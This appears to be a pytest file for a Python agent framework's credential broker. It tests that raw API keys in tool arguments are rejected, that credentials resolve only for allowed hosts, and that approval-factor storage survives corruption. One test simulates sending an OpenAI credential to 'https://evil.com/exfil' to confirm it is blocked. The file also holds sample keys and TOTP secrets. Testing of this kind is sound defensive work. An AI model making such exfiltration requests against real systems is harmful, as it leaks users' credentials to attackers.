"""M0.T9, T11-T13: Credential broker tests."""

from __future__ import annotations

import json
from datetime import UTC, datetime

import pytest

import shisad.security.credentials as credentials_module
from shisad.core.atomic_state import (
    AtomicWriteError,
    AtomicWriteStage,
    StatePersistenceDegradedError,
    write_state,
)
from shisad.core.storage_platform import StorageCapability
from shisad.core.tools.registry import ToolRegistry
from shisad.core.tools.schema import ToolDefinition, ToolParameter
from shisad.core.types import Capability, PEPDecisionKind, ToolName
from shisad.security.credentials import (
    ApprovalFactorRecord,
    CredentialConfig,
    CredentialRef,
    InMemoryCredentialStore,
    RecoveryCodeRecord,
    generate_placeholder,
    is_placeholder,
)
from shisad.security.pep import PEP, PolicyContext
from shisad.security.policy import EgressRule, PolicyBundle


class TestPepRejectsRawSecrets:
    """M0.T9: credential broker rejects raw secrets in tool args."""

    def test_rejects_openai_key(self) -> None:
        registry = ToolRegistry()
        registry.register(
            ToolDefinition(
                name=ToolName("http_call"),
                description="Make HTTP request",
                parameters=[ToolParameter(name="url", type="string")],
                capabilities_required=[Capability.HTTP_REQUEST],
            )
        )
        policy = PolicyBundle(default_require_confirmation=False)
        pep = PEP(policy, registry)
        ctx = PolicyContext(capabilities={Capability.HTTP_REQUEST})

        decision = pep.evaluate(
            ToolName("http_call"),
            {"url": "https://api.example.com", "api_key": "sk-proj-abc123def456"},
            ctx,
        )
        assert decision.kind == PEPDecisionKind.REJECT
        assert "raw secret" in decision.reason.lower() or "Unexpected argument" in decision.reason

    def test_rejects_aws_key(self) -> None:
        registry = ToolRegistry()
        registry.register(
            ToolDefinition(
                name=ToolName("aws_call"),
                description="AWS API call",
                parameters=[
                    ToolParameter(name="service", type="string"),
                    ToolParameter(name="key", type="string"),
                ],
                capabilities_required=[Capability.HTTP_REQUEST],
            )
        )
        policy = PolicyBundle(default_require_confirmation=False)
        pep = PEP(policy, registry)
        ctx = PolicyContext(capabilities={Capability.HTTP_REQUEST})

        decision = pep.evaluate(
            ToolName("aws_call"),
            {"service": "s3", "key": "AKIAIOSFODNN7EXAMPLE"},
            ctx,
        )
        assert decision.kind == PEPDecisionKind.REJECT
        assert "raw secret" in decision.reason.lower()


class TestPlaceholderGeneration:
    """M0.T11: placeholder generation is deterministic per credential_ref."""

    def test_deterministic(self) -> None:
        ref = CredentialRef("openai_api_key")
        p1 = generate_placeholder(ref)
        p2 = generate_placeholder(ref)
        assert p1 == p2

    def test_different_refs_different_placeholders(self) -> None:
        p1 = generate_placeholder(CredentialRef("key_a"))
        p2 = generate_placeholder(CredentialRef("key_b"))
        assert p1 != p2

    def test_is_placeholder(self) -> None:
        ref = CredentialRef("test")
        p = generate_placeholder(ref)
        assert is_placeholder(p)
        assert not is_placeholder("not_a_placeholder")


class TestCredentialStoreReturnsPlaceholder:
    """M0.T12: credential store returns placeholder, never raw value."""

    def test_get_placeholder_not_raw_value(self) -> None:
        store = InMemoryCredentialStore()
        ref = CredentialRef("openai_key")
        store.register(
            ref,
            "sk-real-secret-value",
            CredentialConfig(allowed_hosts=["api.openai.com"]),
        )
        placeholder = store.get_placeholder(ref)
        assert "sk-real-secret-value" not in placeholder
        assert is_placeholder(placeholder)

    def test_unknown_ref_raises(self) -> None:
        store = InMemoryCredentialStore()
        with pytest.raises(KeyError):
            store.get_placeholder(CredentialRef("nonexistent"))


class TestHostScopedBinding:
    """M0.T13: host-scoped binding rejects credential use for non-allowed host."""

    def test_allowed_host_resolves(self) -> None:
        store = InMemoryCredentialStore()
        ref = CredentialRef("openai_key")
        store.register(
            ref,
            "sk-real-secret",
            CredentialConfig(allowed_hosts=["api.openai.com"]),
        )
        placeholder = store.get_placeholder(ref)
        value = store.resolve(placeholder, "api.openai.com")
        assert value == "sk-real-secret"

    def test_disallowed_host_returns_none(self) -> None:
        store = InMemoryCredentialStore()
        ref = CredentialRef("openai_key")
        store.register(
            ref,
            "sk-real-secret",
            CredentialConfig(allowed_hosts=["api.openai.com"]),
        )
        placeholder = store.get_placeholder(ref)
        value = store.resolve(placeholder, "evil.com")
        assert value is None

    def test_glob_pattern_matching(self) -> None:
        store = InMemoryCredentialStore()
        ref = CredentialRef("anthropic_key")
        store.register(
            ref,
            "sk-ant-secret",
            CredentialConfig(allowed_hosts=["*.anthropic.com"]),
        )
        placeholder = store.get_placeholder(ref)
        assert store.resolve(placeholder, "api.anthropic.com") == "sk-ant-secret"
        assert store.resolve(placeholder, "docs.anthropic.com") == "sk-ant-secret"
        assert store.resolve(placeholder, "evil.com") is None


class TestPepCredentialRefValidation:
    """M0.8.4: PEP validates credential_ref host binding and logs usage."""

    def _make_registry(self) -> ToolRegistry:
        registry = ToolRegistry()
        registry.register(
            ToolDefinition(
                name=ToolName("http_call"),
                description="Make HTTP request with a credential ref",
                parameters=[
                    ToolParameter(name="url", type="string", required=True),
                    ToolParameter(name="credential_ref", type="string", required=True),
                ],
                capabilities_required=[Capability.HTTP_REQUEST],
                destinations=["api.openai.com"],
            )
        )
        return registry

    def test_credential_ref_allowed_for_destination(self) -> None:
        store = InMemoryCredentialStore()
        store.register(
            CredentialRef("openai_api_key"),
            "sk-real-secret",
            CredentialConfig(allowed_hosts=["api.openai.com"]),
        )
        pep = PEP(
            PolicyBundle(
                default_require_confirmation=False,
                egress=[EgressRule(host="api.openai.com")],
            ),
            self._make_registry(),
            credential_store=store,
        )

        decision = pep.evaluate(
            ToolName("http_call"),
            {
                "url": "https://api.openai.com/v1/chat/completions",
                "credential_ref": "openai_api_key",
            },
            PolicyContext(capabilities={Capability.HTTP_REQUEST}),
        )
        assert decision.kind == PEPDecisionKind.ALLOW
        assert pep.credential_attempts
        assert pep.credential_attempts[-1].destination_host == "api.openai.com"

    def test_credential_ref_rejected_for_non_allowed_host(self) -> None:
        store = InMemoryCredentialStore()
        store.register(
            CredentialRef("openai_api_key"),
            "sk-real-secret",
            CredentialConfig(allowed_hosts=["api.openai.com"]),
        )
        pep = PEP(
            PolicyBundle(default_require_confirmation=False),
            self._make_registry(),
            credential_store=store,
        )

        decision = pep.evaluate(
            ToolName("http_call"),
            {
                "url": "https://evil.com/exfil",
                "credential_ref": "openai_api_key",
            },
            PolicyContext(capabilities={Capability.HTTP_REQUEST}),
        )
        assert decision.kind == PEPDecisionKind.REJECT
        assert "credential_ref" in decision.reason


class TestApprovalFactorStore:
    def test_approval_factor_store_persists_and_round_trips(self, tmp_path) -> None:
        store_path = tmp_path / "credentials.json"
        store = InMemoryCredentialStore()
        store.set_approval_store_path(store_path)
        factor = ApprovalFactorRecord(
            credential_id="totp-1",
            user_id="alice",
            method="totp",
            principal_id="ops-laptop",
            secret_b32="GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ",
            created_at=datetime(2026, 4, 6, 12, 0, 0, tzinfo=UTC),
            recovery_codes=[RecoveryCodeRecord(code_hash="recovery-hash")],
        )

        store.register_approval_factor(factor)

        reloaded = InMemoryCredentialStore()
        reloaded.set_approval_store_path(store_path)
        entries = reloaded.list_approval_factors(user_id="alice", method="totp")

        assert len(entries) == 1
        assert entries[0].credential_id == "totp-1"
        assert entries[0].principal_id == "ops-laptop"
        assert entries[0].recovery_codes[0].code_hash == "recovery-hash"
        envelope = json.loads(store_path.read_text(encoding="utf-8"))
        assert set(envelope) == {"schema", "sha256", "payload"}
        assert envelope["payload"]["schema_version"] == "shisad.approval_factor_store.v2"

    def test_approval_factor_revoke_filters_by_user_and_method(self, tmp_path) -> None:
        store = InMemoryCredentialStore()
        store.set_approval_store_path(tmp_path / "credentials.json")
        store.register_approval_factor(
            ApprovalFactorRecord(
                credential_id="totp-a",
                user_id="alice",
                method="totp",
                principal_id="alice-device",
                secret_b32="GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ",
            )
        )
        store.register_approval_factor(
            ApprovalFactorRecord(
                credential_id="totp-b",
                user_id="bob",
                method="totp",
                principal_id="bob-device",
                secret_b32="GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ",
            )
        )

        removed = store.revoke_approval_factor(user_id="alice", method="totp")

        assert removed == 1
        assert [item.credential_id for item in store.list_approval_factors()] == ["totp-b"]

    def test_approval_factor_store_preserves_malformed_json_and_blocks_only_factors(
        self,
        tmp_path,
    ) -> None:
        store_path = tmp_path / "approval-factors.json"
        corrupt = b"{not-json"
        store_path.write_bytes(corrupt)

        store = InMemoryCredentialStore()
        store.set_approval_store_path(store_path)

        assert store.approval_state_health()["status"] == "corrupt"
        assert store_path.read_bytes() == corrupt
        assert list(tmp_path.glob("approval-factors.json.corrupt.*")) == []
        with pytest.raises(StatePersistenceDegradedError):
            store.list_approval_factors()
        # The unrelated credential broker remains usable.
        store.register(
            CredentialRef("api-key"),
            "secret",
            CredentialConfig(allowed_hosts=["api.example.com"]),
        )
        assert store.has_credential(CredentialRef("api-key")) is True

    @pytest.mark.parametrize(
        "payload",
        [
            {},
            {
                "schema_version": "shisad.approval_factor_store.v2",
                "approval_factors": [],
            },
            {
                "schema_version": "shisad.approval_factor_store.v1",
                "approval_factors": [],
                "unexpected": [],
            },
        ],
    )
    def test_approval_factor_store_rejects_partial_or_unknown_legacy_shapes(
        self,
        tmp_path,
        payload: dict[str, object],
    ) -> None:
        store_path = tmp_path / "approval-factors.json"
        raw = json.dumps(payload).encode()
        store_path.write_bytes(raw)

        store = InMemoryCredentialStore()
        store.set_approval_store_path(store_path)

        assert store.approval_state_health()["status"] == "corrupt"
        assert store_path.read_bytes() == raw

    def test_approval_factor_store_rejects_partial_wrapped_state(
        self,
        tmp_path,
    ) -> None:
        store_path = tmp_path / "approval-factors.json"
        write_state(
            store_path,
            {
                "schema_version": "shisad.approval_factor_store.v2",
                "approval_factors": [],
            },
        )
        before = store_path.read_bytes()

        store = InMemoryCredentialStore()
        store.set_approval_store_path(store_path)

        assert store.approval_state_health()["status"] == "corrupt"
        assert store_path.read_bytes() == before

    def test_local_fido2_realm_id_persists_with_factor_store(self, tmp_path) -> None:
        store_path = tmp_path / "approval-factors.json"
        store = InMemoryCredentialStore()
        store.set_approval_store_path(store_path)
        realm_id = store.get_or_create_local_fido2_realm_id(seed="deadbeefcafebabe")

        store.register_approval_factor(
            ApprovalFactorRecord(
                credential_id="local_fido2-1",
                user_id="alice",
                method="local_fido2",
                principal_id="ops-key",
                webauthn_rp_id=f"{realm_id}.approver.shisad.invalid",
            )
        )

        payload = json.loads(store_path.read_text(encoding="utf-8"))["payload"]
        assert payload["local_fido2_realm_id"] == realm_id

        reloaded = InMemoryCredentialStore()
        reloaded.set_approval_store_path(store_path)
        assert reloaded.get_or_create_local_fido2_realm_id() == realm_id

    def test_local_fido2_realm_id_derives_from_legacy_store_without_metadata(
        self,
        tmp_path,
    ) -> None:
        store_path = tmp_path / "approval-factors.json"
        store_path.write_text(
            json.dumps(
                {
                    "schema_version": "shisad.approval_factor_store.v1",
                    "approval_factors": [
                        {
                            "credential_id": "local_fido2-1",
                            "user_id": "alice",
                            "method": "local_fido2",
                            "principal_id": "ops-key",
                            "webauthn_rp_id": "deadbeefcafebabe.approver.shisad.invalid",
                        }
                    ],
                }
            ),
            encoding="utf-8",
        )

        store = InMemoryCredentialStore()
        store.set_approval_store_path(store_path)

        assert store.get_or_create_local_fido2_realm_id() == "deadbeefcafebabe"
        envelope = json.loads(store_path.read_text(encoding="utf-8"))
        assert set(envelope) == {"schema", "sha256", "payload"}

    def test_approval_factor_store_uses_short_lived_adjacent_lock(
        self,
        tmp_path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        store_path = tmp_path / "approval-factors.json"
        lock_paths: list[str] = []

        class _RecordingLock:
            def __init__(self, path: str, **_kwargs: object) -> None:
                lock_paths.append(path)

            def __enter__(self) -> _RecordingLock:
                return self

            def __exit__(self, *_args: object) -> None:
                return None

        monkeypatch.setattr(credentials_module, "FileLock", _RecordingLock, raising=False)
        store = InMemoryCredentialStore()
        store.set_approval_store_path(store_path)
        store.register_approval_factor(
            ApprovalFactorRecord(
                credential_id="totp-locked",
                user_id="alice",
                method="totp",
                principal_id="device",
                secret_b32="GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ",
            )
        )

        adjacent = str(store_path.with_name("approval-factors.json.lock"))
        assert lock_paths == [adjacent, adjacent]

    def test_approval_factor_publication_failure_preserves_prior_state(
        self,
        tmp_path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        store_path = tmp_path / "approval-factors.json"
        store = InMemoryCredentialStore()
        store.set_approval_store_path(store_path)
        store.register_approval_factor(
            ApprovalFactorRecord(
                credential_id="stable",
                user_id="alice",
                method="totp",
                principal_id="device",
                secret_b32="GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ",
            )
        )
        before = store_path.read_bytes()

        def _fail(*_args: object, **_kwargs: object) -> object:
            raise AtomicWriteError(
                path=store_path,
                stage=AtomicWriteStage.FILE_FSYNC,
                publication_may_have_committed=False,
            )

        monkeypatch.setattr(credentials_module, "write_state", _fail, raising=False)

        with pytest.raises(StatePersistenceDegradedError):
            store.register_approval_factor(
                ApprovalFactorRecord(
                    credential_id="uncommitted",
                    user_id="alice",
                    method="totp",
                    principal_id="device-2",
                    secret_b32="GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ",
                )
            )

        assert store_path.read_bytes() == before
        assert store.approval_state_health()["status"] == "corrupt"

    def test_approval_factor_permission_failure_degrades_only_factor_state(
        self,
        tmp_path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        store = InMemoryCredentialStore()
        store.set_approval_store_path(tmp_path / "approval-factors.json")
        ref = CredentialRef("provider-token")
        store.register(ref, "secret", CredentialConfig(allowed_hosts=["api.example"]))
        monkeypatch.setattr(
            credentials_module,
            "write_state",
            lambda *_args, **_kwargs: StorageCapability(permissions="failed"),
        )

        with pytest.raises(StatePersistenceDegradedError):
            store.register_approval_factor(
                ApprovalFactorRecord(
                    credential_id="unsafe",
                    user_id="alice",
                    method="totp",
                    principal_id="device",
                    secret_b32="GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ",
                )
            )

        assert store.approval_state_health()["permissions"] == "failed"
        assert store.resolve(store.get_placeholder(ref), "api.example") == "secret"
